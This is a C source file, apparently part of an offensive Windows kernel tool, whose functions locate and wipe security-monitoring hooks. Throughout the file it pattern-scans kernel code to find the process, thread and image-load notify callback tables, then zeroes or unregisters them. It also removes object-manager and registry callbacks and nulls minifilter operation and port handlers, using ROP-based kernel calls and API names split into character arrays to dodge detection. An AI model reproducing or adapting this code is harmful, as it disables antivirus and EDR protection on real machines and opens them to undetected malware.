#pragma once
#include"RopInit.h"


PVOID SearchMemory(PVOID pStartAddress, PVOID pEndAddress, PUCHAR pMemoryData, ULONG ulMemoryDataSize)
{
	PVOID pAddress = NULL;
	PUCHAR i = NULL;
	ULONG m = 0;

	for (i = (PUCHAR)pStartAddress; i < (PUCHAR)pEndAddress; i++)
	{
		for (m = 0; m < ulMemoryDataSize; m++)
		{
			if (*(PUCHAR)(i + m) != pMemoryData[m])
			{
				break;
			}
		}
		if (m >= ulMemoryDataSize)
		{
			pAddress = (PVOID)(i + ulMemoryDataSize);
			break;
		}
	}

	return pAddress;
}

BOOL IsMoreThanWin7()
{
	RTL_OSVERSIONINFOW osInfo = { 0 };
	RtlGetVersion(&osInfo);
	if (6 == osInfo.dwMajorVersion && osInfo.dwMinorVersion < 3)
	{
		return false;
	}
	return true;
}

// PsSetCreateProcessNotifyRoutine
BOOL DisablePsProcess()
{
	LONG lOffset = 0;
	UCHAR pSpecialData[50] = { 0 };
	ULONG ulSpecialDataSize = 0;
	//PsSetCreateProcessNotifyRoutine
	char PsSetCreateProcessNotifyRoutineStr[] = { 'P','s','S','e','t','C','r','e','a','t','e','P','r','o','c','e','s','s','N','o','t','i','f','y','R','o','u','t','i','n','e','\0' };
	ULONG64 PsSetCreateProcessNotifyRoutine = GetImgKernelFuncAddress((char*)PsSetCreateProcessNotifyRoutineStr);

	if (IsMoreThanWin7())
	{
		pSpecialData[0] = 0xE8;
		ulSpecialDataSize = 1;
		PVOID pAddress = SearchMemory((PVOID)PsSetCreateProcessNotifyRoutine, (PVOID)((PUCHAR)PsSetCreateProcessNotifyRoutine + 0xFF), pSpecialData, ulSpecialDataSize);
		if (!pAddress)
		{
#ifdef _DEBUG
			printf("PsSetCreateProcessNotifyRoutine Offset failed \n");
#endif
			return false;
		}

		lOffset = *(PLONG)pAddress;
		ULONG64 pPspCreateProcessRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset);

		pSpecialData[0] = 0x4C;
		pSpecialData[1] = 0x8D;
		pSpecialData[2] = 0x2D;
		ulSpecialDataSize = 3;

		pAddress = SearchMemory((PVOID)pPspCreateProcessRoutine, (PVOID)((PUCHAR)pPspCreateProcessRoutine + 0xff), pSpecialData, ulSpecialDataSize);
		if (!pAddress)
		{
#ifdef _DEBUG
			printf("pPspCreateProcessRoutine Offset failed \n");
#endif
			return false;
		}

		lOffset = *(PLONG)pAddress;
		ULONG64 PspCreateProcessNotifyRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();

#ifdef _DEBUG
		printf("PspCreateProcessNotifyRoutine 0x%llX \n", PspCreateProcessNotifyRoutine);
#endif
		for (int i = 0; i < 64; i++)
		{
#ifdef _DEBUG
			ULONG64 CallBackAddress = NULL;
			NTSTATUS status = ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &CallBackAddress, true);
			if (NT_SUCCESS(status))
			{
				if (CallBackAddress)
				{
					CallBackAddress &= 0xfffffffffffffff8;
					ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
					printf("\tPspCreateProcessCallBackAddress %llX \n", CallBackAddress);
				}
			}
#endif
			ULONG64 zero = NULL;
			ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &zero, false);
		}
	}
	else
	{
		pSpecialData[0] = 0xE9;
		ulSpecialDataSize = 1;
		PVOID pAddress = SearchMemory((PVOID)PsSetCreateProcessNotifyRoutine, (PVOID)((PUCHAR)PsSetCreateProcessNotifyRoutine + 0xFF), pSpecialData, ulSpecialDataSize);
		if (!pAddress)
		{
			pSpecialData[0] = 0xE8;
			ulSpecialDataSize = 1;
			pAddress = SearchMemory((PVOID)PsSetCreateProcessNotifyRoutine, (PVOID)((PUCHAR)PsSetCreateProcessNotifyRoutine + 0xFF), pSpecialData, ulSpecialDataSize);
		}

		if (!pAddress)
		{
#ifdef _DEBUG
			printf("PsSetCreateProcessNotifyRoutine Offset failed \n");
#endif
			return false;
		}

		lOffset = *(PLONG)pAddress;
		ULONG64 pPspCreateProcessRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset);

		pSpecialData[0] = 0x4C;
		pSpecialData[1] = 0x8D;
		pSpecialData[2] = 0x35;
		ulSpecialDataSize = 3;

		pAddress = SearchMemory((PVOID)pPspCreateProcessRoutine, (PVOID)((PUCHAR)pPspCreateProcessRoutine + 0xff), pSpecialData, ulSpecialDataSize);
		if (!pAddress)
		{
#ifdef _DEBUG
			printf("pPspCreateProcessRoutine Offset failed \n");
#endif
			return false;
		}
			
		lOffset = *(PLONG)pAddress;
		ULONG64 PspCreateProcessNotifyRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();

#ifdef _DEBUG
		printf("PspCreateProcessNotifyRoutine 0x%llX \n", PspCreateProcessNotifyRoutine);
#endif

		for (int i = 0; i < 64; i++)
		{
#ifdef _DEBUG
			ULONG64 CallBackAddress = NULL;
			NTSTATUS status = ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &CallBackAddress, true);
			if (NT_SUCCESS(status))
			{
				if (CallBackAddress)
				{
					CallBackAddress &= 0xfffffffffffffff8;
					ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
					printf("\tPspCreateProcessCallBackAddress %llX \n", CallBackAddress);
				}
			}
#endif
			ULONG64 zero = NULL;
			ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &zero, false);
		}
	}
	return true;
}

//PsSetLoadImageNotifyRoutine
void RemoveImageNotifyRoutine(PVOID pNotifyRoutineAddress)
{
	DWORD_PTR Status;
	PVOID Args[] = { KF_ARG(pNotifyRoutineAddress)};
	//PsRemoveLoadImageNotifyRoutine
	char PsRemoveLoadImageStr[] = { 'P','s','R','e','m','o','v','e','L','o','a','d','I','m','a','g','e','N','o','t','i','f','y','R','o','u','t','i','n','e','\0'};
	RopCall((char*)PsRemoveLoadImageStr, Args, 1, KF_RET(&Status));
}
BOOL DisablePsImg()
{
	LONG lOffset = 0;
	UCHAR pSpecialData[50] = { 0 };
	ULONG ulSpecialDataSize = 0;
	//PsRemoveLoadImageNotifyRoutine
	char PsRemoveLoadImageStr[] = { 'P','s','R','e','m','o','v','e','L','o','a','d','I','m','a','g','e','N','o','t','i','f','y','R','o','u','t','i','n','e','\0' };
	ULONG64 PsRemoveLoadImage = GetImgKernelFuncAddress((char *)PsRemoveLoadImageStr);

	pSpecialData[0] = 0x48;
	pSpecialData[1] = 0x8D;
	pSpecialData[2] = 0x0D;
	ulSpecialDataSize = 3;

	PVOID pAddress = SearchMemory((PVOID)PsRemoveLoadImage,(PVOID)((PUCHAR)PsRemoveLoadImage + 0xFF),pSpecialData, ulSpecialDataSize);
	if (!pAddress)
	{
#ifdef _DEBUG
		printf("PsRemoveLoadImage Offset failed \n");
#endif
		return false;
	}

	lOffset = *(PLONG)pAddress;
	ULONG64 pPspLoadImageNotifyRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();
	if (!pPspLoadImageNotifyRoutine)
	{
#ifdef _DEBUG
		printf("pPspLoadImageNotifyRoutine Offset failed \n");
#endif
		return false;
	}

#ifdef _DEBUG
	printf("pPspLoadImageNotifyRoutine %llX \n", pPspLoadImageNotifyRoutine);
#endif

	for (int i = 0; i < 64; i++)
	{
		ULONG64 CallBackAddress = NULL;
		NTSTATUS status = ReadWriteVirtualAddressValue(pPspLoadImageNotifyRoutine + i * sizeof(ULONG64),sizeof(ULONG64),&CallBackAddress,true);
		if (NT_SUCCESS(status))
		{
			if (CallBackAddress)
			{
				CallBackAddress &= 0xfffffffffffffff8;
				ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
				if (CallBackAddress) 
				{
					RemoveImageNotifyRoutine((PVOID)CallBackAddress);
#ifdef _DEBUG
					printf("\tImageNotifyCallBackAddress %llX \n", CallBackAddress);
#endif
				}
					
			}
		}
	}

	return true;
}

// PsSetCreateThreadNotifyRoutine
void  PsRemoveCreateThreadRoutine(PVOID pNotifyRoutineAddress)
{
	DWORD_PTR Status;
	PVOID Args[] = { KF_ARG(pNotifyRoutineAddress) };
	//PsRemoveLoadImageNotifyRoutine
	char PsRemoveCreateThreadStr[] = { 'P','s','R','e','m','o','v','e','C','r','e','a','t','e','T','h','r','e','a','d','N','o','t','i','f','y','R','o','u','t','i','n','e','\0' };
	RopCall((char*)PsRemoveCreateThreadStr, Args, 1, KF_RET(&Status));
}
BOOL DisablePsThread()
{
	LONG lOffset = 0;
	UCHAR pSpecialData[50] = { 0 };
	ULONG ulSpecialDataSize = 0;
	//PsRemoveCreateThreadNotifyRoutine
	char PsRemoveCreateThreadStr[] = { 'P','s','R','e','m','o','v','e','C','r','e','a','t','e','T','h','r','e','a','d','N','o','t','i','f','y','R','o','u','t','i','n','e','\0' };
	ULONG64 PsRemoveCreateThread = GetImgKernelFuncAddress((char*)PsRemoveCreateThreadStr);

	pSpecialData[0] = 0x48;
	pSpecialData[1] = 0x8D;
	pSpecialData[2] = 0x0D;
	ulSpecialDataSize = 3;

	PVOID pAddress = SearchMemory((PVOID)PsRemoveCreateThread, (PVOID)((PUCHAR)PsRemoveCreateThread + 0xFF), pSpecialData, ulSpecialDataSize);
	if (!pAddress)
	{
#ifdef _DEBUG
		printf("PsRemoveCreateThread Offset failed \n");
#endif
		return false;
	}

	lOffset = *(PLONG)pAddress;
	ULONG64 pPspCreateThreadRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();
	if (!pPspCreateThreadRoutine)
	{
#ifdef _DEBUG
		printf("pPspCreateThreadRoutine Offset failed \n");
#endif
		return false;
	}

#ifdef _DEBUG
	printf("pPspCreateThreadRoutine %llX \n", pPspCreateThreadRoutine);
#endif

	for (int i = 0; i < 64; i++)
	{
		ULONG64 CallBackAddress = NULL;
		NTSTATUS status = ReadWriteVirtualAddressValue(pPspCreateThreadRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &CallBackAddress, true);
		if (NT_SUCCESS(status))
		{
			if (CallBackAddress)
			{
				CallBackAddress &= 0xfffffffffffffff8;
				ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
				if (CallBackAddress)
				{
					PsRemoveCreateThreadRoutine((PVOID)CallBackAddress);
#ifdef _DEBUG
					printf("\tThreadRoutineCallBackAddress %llX \n", CallBackAddress);
#endif
				}	
			}
		}
	}
	return true;
}

//ObRegisterCallbacks
void RemoveObCallback(PVOID RegistrationHandle)
{
	DWORD_PTR Status = NULL;
	PVOID Args[] = { KF_ARG(RegistrationHandle)};
	//ObUnRegisterCallbacks
	char ObUnRegisterCallbacksStr[] = { 'O','b','U','n','R','e','g','i','s','t','e','r','C','a','l','l','b','a','c','k','s','\0' };
	RopCall((char*)ObUnRegisterCallbacksStr, Args, 1, KF_RET(&Status));
}
BOOL DisableObCallBack()
{
	//PsProcessType
	char ProcessTypeStr[] = { 'P','s','P','r','o','c','e','s','s','T','y','p','e','\0' };
	ULONG64 PsProcessType = GetKernelFuncAddress((char*)ProcessTypeStr);

	//PsThreadType
	char ThreadTypeStr[] = { 'P','s','T','h','r','e','a','d','T','y','p','e','\0' };
	ULONG64 PsThreadType = GetKernelFuncAddress((char*)ThreadTypeStr);


	ULONG64 proObj = NULL, threadObj = NULL;

	ReadWriteVirtualAddressValue(PsProcessType, sizeof(ULONG64), &proObj, true);
	ReadWriteVirtualAddressValue(PsThreadType, sizeof(ULONG64), &threadObj, true);

	if (!threadObj || !proObj)
	{
#ifdef _DEBUG
		printf("threadObj || proObj get failed \n");
#endif
		return false;
	}

	ULONG listOffset = 0xC8;
	if (!IsMoreThanWin7())
		listOffset = 0xC0;

	LIST_ENTRY CallbacProckList = { 0 };
	LIST_ENTRY CallbacThreadkList = { 0 };
	ReadWriteVirtualAddressValue(proObj + listOffset, sizeof(LIST_ENTRY), &CallbacProckList, true);
	ReadWriteVirtualAddressValue(threadObj + listOffset, sizeof(LIST_ENTRY), &CallbacThreadkList, true);


	if (!CallbacProckList.Flink || !CallbacThreadkList.Flink)
	{
#ifdef _DEBUG
		printf("CallbacProckList.Flink || CallbacThreadkList.Flink empty \n");
#endif
		return false;
	} 

#ifdef _DEBUG
	printf("CallbacProckList.Flink %p || CallbacThreadkList.Flink %p \n", CallbacProckList.Flink, CallbacThreadkList.Flink);
#endif

	ULONG count = 0;
	ULONG64 Handles[0x100] = { 0 };

	if ((ULONG64)CallbacProckList.Flink != proObj + listOffset)//isEmptylist
	{
		OB_CALLBACK ObProcCallback = { 0 };
		ReadWriteVirtualAddressValue((ULONG64)CallbacProckList.Flink, sizeof(OB_CALLBACK), &ObProcCallback, true);
		do
		{
			if (ObProcCallback.ListEntry.Flink && ObProcCallback.ObHandle)
			{
				Handles[count++] = (ULONG64)ObProcCallback.ObHandle;
				//会蓝屏buffer over flow
				//if (ObProcCallback.ObHandle)
				//	 RemoveObCallback(ObProcCallback.ObHandle);
#ifdef _DEBUG
				printf("\tObProcCallback  ObProcCallback.PreCall %p ObProcCallback.PostCall %p\n", ObProcCallback.PreCall, ObProcCallback.PostCall);
#endif
				ReadWriteVirtualAddressValue((ULONG64)ObProcCallback.ListEntry.Flink, sizeof(OB_CALLBACK), &ObProcCallback, true);
			}
		} while (CallbacProckList.Flink != ObProcCallback.ListEntry.Flink);
	}
	
	if ((ULONG64)CallbacThreadkList.Flink != threadObj + listOffset)//isEmptylist
	{
		OB_CALLBACK ObThreadCallback = { 0 };
		ReadWriteVirtualAddressValue((ULONG64)CallbacThreadkList.Flink, sizeof(OB_CALLBACK), &ObThreadCallback, true);
		do
		{
			if (ObThreadCallback.ListEntry.Flink && ObThreadCallback.ObHandle)
			{
				Handles[count++] = (ULONG64)ObThreadCallback.ObHandle;
				//if (ObThreadCallback.ObHandle)
				//	RemoveObCallback(ObThreadCallback.ObHandle);
#ifdef _DEBUG
				printf("\tObThreadCallback ObThreadCallback.PreCall %p ObThreadCallback.PostCall %p \n", ObThreadCallback.PreCall, ObThreadCallback.PostCall);
#endif
				ReadWriteVirtualAddressValue((ULONG64)ObThreadCallback.ListEntry.Flink, sizeof(OB_CALLBACK), &ObThreadCallback, true);
			}
		} while (CallbacThreadkList.Flink != ObThreadCallback.ListEntry.Flink);
	}

	while (count)
		RemoveObCallback((PVOID)Handles[--count]);

	return true;
}

//CmRegisterCallback
void CmUnRegisterCallback(PVOID RegistrationHandle)
{
	DWORD_PTR Status = NULL;
	PVOID Args[] = { KF_ARG(RegistrationHandle) };
	//CmUnRegisterCallback
	char CmUnRegisterCallbackStr[] = { 'C','m','U','n','R','e','g','i','s','t','e','r','C','a','l','l','b','a','c','k','\0' };
	RopCall((char*)CmUnRegisterCallbackStr, Args, 1, KF_RET(&Status));
}
BOOL DisableCm()
{
	LONG lOffset = 0;
	UCHAR pSpecialData[50] = { 0 };
	ULONG ulSpecialDataSize = 0;
	LONG lSpecialOffset = 0;
	ULONG64 pCallbackListHead = NULL;

	//CmUnRegisterCallback
	char CmUnRegisterCallbackStr[] = { 'C','m','U','n','R','e','g','i','s','t','e','r','C','a','l','l','b','a','c','k','\0' };
	ULONG64 CmUnRegisterCallbackfunc = GetImgKernelFuncAddress((char*)CmUnRegisterCallbackStr);

	
	if (!IsMoreThanWin7())
	{
		pSpecialData[0] = 0x48;
		pSpecialData[1] = 0x8D;
		pSpecialData[2] = 0x54;
		ulSpecialDataSize = 3;
		lSpecialOffset = 5;

		PVOID pAddress = SearchMemory((PVOID)CmUnRegisterCallbackfunc, (PVOID)((PUCHAR)CmUnRegisterCallbackfunc + 0xFF), pSpecialData, ulSpecialDataSize);
		if (!pAddress)
			return false;

		lOffset = *(PLONG)((PUCHAR)pAddress + lSpecialOffset);
		pCallbackListHead = (ULONG64)((PUCHAR)pAddress + lSpecialOffset + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();
	}
	else
	{
		pSpecialData[0] = 0x48;
		pSpecialData[1] = 0x8D;
		pSpecialData[2] = 0x0D;
		ulSpecialDataSize = 3;

		PVOID pAddress = SearchMemory((PVOID)CmUnRegisterCallbackfunc, (PVOID)((PUCHAR)CmUnRegisterCallbackfunc + 0xFF), pSpecialData, ulSpecialDataSize);
		if (!pAddress)
			return false;

		lOffset = *(PLONG)(pAddress);
		pCallbackListHead = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();
	}

	if (!pCallbackListHead)
		return false;

	CM_NOTIFY_ENTRY NotifyEntry = { 0 };
	ReadWriteVirtualAddressValue(pCallbackListHead, sizeof(CM_NOTIFY_ENTRY), &NotifyEntry, true);
	if (!NotifyEntry.ListEntryHead.Flink)
	{
#ifdef _DEBUG
		printf("NotifyEntry.ListEntryHead.Flink empty \n");
#endif
		return false;
	}

#ifdef _DEBUG
	printf("NotifyEntry.ListEntryHead.Flink %p \n", NotifyEntry.ListEntryHead.Flink);
#endif

	ULONG count = 0;
	ULONG64 Handles[0x100] = { 0 };
	if (pCallbackListHead != (ULONG64)NotifyEntry.ListEntryHead.Flink)//isEmptylist
	{
		do
		{
			ReadWriteVirtualAddressValue((ULONG64)NotifyEntry.ListEntryHead.Flink, sizeof(CM_NOTIFY_ENTRY), &NotifyEntry, true);

			if (NotifyEntry.ListEntryHead.Flink && NotifyEntry.Function && NotifyEntry.Cookie.QuadPart)
				Handles[count++] = (ULONG64)NotifyEntry.Cookie.QuadPart;
#ifdef _DEBUG
			printf("\tNotifyEntry.Function %p\n", NotifyEntry.Function);
#endif
		} while (pCallbackListHead != (ULONG64)NotifyEntry.ListEntryHead.Flink);
	}

	while (count)
		CmUnRegisterCallback((PVOID)Handles[--count]);

	return true;
}

//FltRegisterFilter
void FltUnregisterFilter(PVOID Filter,ULONG64 flt)
{
	//FltUnregisterFilter
	DWORD_PTR Status = NULL;
	PVOID Args[] = { KF_ARG(Filter) };
	char FltUnregisterFilterStr[] = { 'F','l','t','U','n','r','e','g','i','s','t','e','r','F','i','l','t','e','r','\0' };
	PVOID FltUnregisterFilter = GetFltFuncOffset(FltUnregisterFilterStr, flt);
	if (FltUnregisterFilter)
	{
		RopCallAddr(FltUnregisterFilter, Args, 1, KF_RET(&Status));
	}
}
BOOL DisableMinifilter()
{
	ULONG64 flt = NULL;
	LONG lOperationsOffset = 0;	//不支持win8，简单区分一下win7和win10
	LONG lConnectionListOffset = 0;

	if (IsMoreThanWin7())
	{
		char fltStr[] = { 'F','L','T','M','G','R','.','S','Y','S' ,'\0'};
		flt = GetKernelBaseByName(fltStr);
		lOperationsOffset = 0x1A8;
		lConnectionListOffset = 0x208 + 0x38;
	}
	else
	{	
		char fltStr[] = { 'f','l','t','m','g','r','.','s','y','s' ,'\0' };
		flt = GetKernelBaseByName(fltStr);
		lOperationsOffset = 0x188;
		lConnectionListOffset = 0x1e8 + 0x38;
	}

	if (!flt)
	{
#ifdef _DEBUG
		printf("get flt kernelBase failed \n");
#endif
		return false;
	}

	//FltEnumerateFilters
	char emuFltStr[] = { 'F','l','t','E','n','u','m','e','r','a','t','e','F','i','l','t','e','r','s','\0'};
	PVOID FltEnumerateFilters =GetFltFuncOffset(emuFltStr, flt);
	if (!FltEnumerateFilters)
	{
#ifdef _DEBUG
		printf("get FltEnumerateFilters function failed \n");
#endif
		return false;
	}

	DWORD_PTR Status = NULL;
	ULONG64 ulFilterListSize = 0;
	PVOID Args[] = {	KF_ARG(0),
						KF_ARG(0) ,
						KF_ARG(&ulFilterListSize) };
	RopCallAddr(FltEnumerateFilters, Args, 3, KF_RET(&Status));

	if (!ulFilterListSize)
	{
#ifdef _DEBUG
		printf("call FltEnumerateFilters get ulFilterListSize failed \n");
#endif
		return false;
	}

	//FltEnumerateFilters twice
	PULONG64 ppFilterList = NULL;
	ppFilterList = (PULONG64)malloc(ulFilterListSize * sizeof(PVOID));
	if (!ppFilterList)
	{
#ifdef _DEBUG
		printf("malloc ppFilterList failed \n");
#endif
		return false;
	}

	PVOID Args_2[] = { KF_ARG(ppFilterList),
						KF_ARG(ulFilterListSize) ,
						KF_ARG(&ulFilterListSize) };
	RopCallAddr(FltEnumerateFilters, Args_2, 3, KF_RET(&Status));

	for (ULONG64 i = 0; i < ulFilterListSize; i++)
	{
		if (ppFilterList[i])
		{
#ifdef _DEBUG
			printf("ppFilterList %llX \n", ppFilterList[i]);
#endif
			ULONG64	Operations = NULL;
			ReadWriteVirtualAddressValue(ppFilterList[i] + lOperationsOffset, sizeof(ULONG64), &Operations, true);
			if (Operations)
			{
#ifdef _DEBUG
				printf("\tOperations %llX \n", Operations);
#endif
				FLT_OPERATION_REGISTRATION FltOperationRegistration = { 0 };
				ReadWriteVirtualAddressValue(Operations, sizeof(FLT_OPERATION_REGISTRATION), &FltOperationRegistration, true);
				while (IRP_MJ_OPERATION_END != FltOperationRegistration.MajorFunction)
				{
					if (IRP_MJ_MAXIMUM_FUNCTION > FltOperationRegistration.MajorFunction)     // MajorFunction ID Is: 0~27
					{
						//pre & post
						if (g_RopAddr_6)
						{
							//ReadWriteVirtualAddressValue(Operations + 0x8, sizeof(ULONG64), &g_RopAddr_6, false);
							//ReadWriteVirtualAddressValue(Operations + 0x10, sizeof(ULONG64), &g_RopAddr_6, false);
							ULONG64 zero = NULL;
							ReadWriteVirtualAddressValue(Operations + 0x8, sizeof(ULONG64), &zero, false);
							ReadWriteVirtualAddressValue(Operations + 0x10, sizeof(ULONG64), &zero, false);
						}
#ifdef _DEBUG
						printf("\tFltOperationRegistration.MajorFunction 0x%x FltOperationRegistration.PreOperation %p\n", FltOperationRegistration.MajorFunction, FltOperationRegistration.PreOperation);
#endif
					}
					Operations += sizeof(FLT_OPERATION_REGISTRATION);
					ReadWriteVirtualAddressValue(Operations, sizeof(FLT_OPERATION_REGISTRATION), &FltOperationRegistration, true);
				}
			}
			//FltUnregisterFilter((PVOID)ppFilterList[i],flt);

			FLT_SERVER_PORT_OBJECT serverPort = { 0 };
			ReadWriteVirtualAddressValue(ppFilterList[i] + lConnectionListOffset, sizeof(FLT_SERVER_PORT_OBJECT), &serverPort, true);
			if (ppFilterList[i] + lConnectionListOffset != (ULONG64)serverPort.FilterLink.Flink) //FLT_SERVER_PORT_OBJECT
			{
#ifdef _DEBUG
				printf("\tppFilterList[i] %llX serverPort.FilterLink.Flink %p \n", ppFilterList[i], serverPort.FilterLink.Flink);
#endif
				do 
				{
					ULONG64 preServerObj = (ULONG64)serverPort.FilterLink.Flink;
					ReadWriteVirtualAddressValue((ULONG64)serverPort.FilterLink.Flink,sizeof(FLT_SERVER_PORT_OBJECT) ,&serverPort,true);
#ifdef _DEBUG
					printf("\t\tserverPort.ConnectNotify  %p serverPort.MessageNotify %p \n", serverPort.ConnectNotify,serverPort.MessageNotify);
#endif
					//ReadWriteVirtualAddressValue(preServerObj + 0x10, sizeof(ULONG64), &g_RopAddr_6, false);
					//ReadWriteVirtualAddressValue(preServerObj + 0x18, sizeof(ULONG64), &g_RopAddr_6, false);
					//ReadWriteVirtualAddressValue(preServerObj + 0x20, sizeof(ULONG64), &g_RopAddr_6, false);
					ULONG64 zero = NULL;
					ReadWriteVirtualAddressValue(preServerObj + 0x10, sizeof(ULONG64), &zero, false);
					ReadWriteVirtualAddressValue(preServerObj + 0x18, sizeof(ULONG64), &zero, false);
					ReadWriteVirtualAddressValue(preServerObj + 0x20, sizeof(ULONG64), &zero, false);
					
				} while (ppFilterList[i] + lConnectionListOffset != (ULONG64)serverPort.FilterLink.Flink);
			}
		}
	}
	free(ppFilterList);
	return true;
}